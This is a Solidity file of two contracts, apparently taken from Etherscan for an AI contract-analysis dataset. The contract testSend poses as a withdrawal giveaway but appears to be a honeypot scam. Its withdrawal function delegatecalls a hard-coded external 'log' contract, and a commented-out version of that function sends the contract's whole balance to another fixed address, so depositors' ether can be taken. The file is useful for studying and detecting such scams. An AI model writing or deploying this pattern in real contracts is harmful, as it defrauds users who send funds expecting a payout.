/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity 0.4.19;
contract loglib {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }
   
   /*function logSendEvent() payable public{
       address addr = 0xe3632684dB2BCE417dF118686F315872b2Fc4E3D;
       require(addr.send(this.balance));
   }*/
   
}

contract testSend
{
    address Owner=msg.sender;
    uint256 public Limit= 1 ether;
    address log = 0x623354A5a3b36F3781c6140311820ce5B727eeFc;

    function()payable public{}
    
    function withdrawal()
    payable public
    {

        if(msg.value>=Limit)
        {
            log.delegatecall(bytes4(sha3("logSendEvent()")));
            msg.sender.send(this.balance);
        }
    }

    function kill() public {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }

}